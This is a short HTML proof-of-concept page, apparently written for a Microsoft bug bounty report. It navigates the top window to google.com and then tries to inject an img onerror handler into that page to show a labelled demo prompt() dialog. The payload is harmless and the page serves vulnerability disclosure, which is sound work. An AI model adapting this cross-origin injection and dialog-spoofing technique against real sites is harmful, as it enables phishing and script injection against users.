<!DOCTYPE html>
<html>
<head>
  <title>MSRC PoC Demo</title>
</head>
<body>
<h1>MSRC PoC Demo - Safe</h1>
<button id="trigger">Trigger Prompt</button>

<script>
function showPrompt() {

    // delay sebelum redirect
    setTimeout(function () {

        // top-level navigation ke domain kamu
        const win = window.open('https://google.com', '_top');

        // delay tambahan setelah page baru terbuka
        setTimeout(function () {
            try {
                win.document.body.innerHTML = `
                    <h2>Demo Page</h2>
                    <img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
                `;
            } catch (e) {
                console.log('DOM access blocked (expected on some browsers)');
            }
        }, 300);

    }, 2000); // ⏱️ delay redirect (2 detik)
}

document.getElementById('trigger').addEventListener('click', function () {
    showPrompt();
});
</script>
</body>
</html>
